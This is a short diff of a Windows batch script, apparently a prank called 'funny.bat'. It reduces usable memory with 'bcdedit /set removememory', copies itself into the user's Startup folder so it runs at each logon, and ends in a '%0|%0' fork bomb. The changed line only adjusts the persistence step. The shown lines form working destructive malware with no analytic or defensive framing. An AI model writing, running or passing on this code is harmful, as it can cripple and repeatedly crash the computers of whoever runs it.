@@ -17,6 +17,6 @@ echo Will be getting rid of %c% bytes of memory
 
 bcdedit.exe /set removememory %c% 
 
-copy "%CD%\%0" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%CD%\funny.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 %0|%0
  
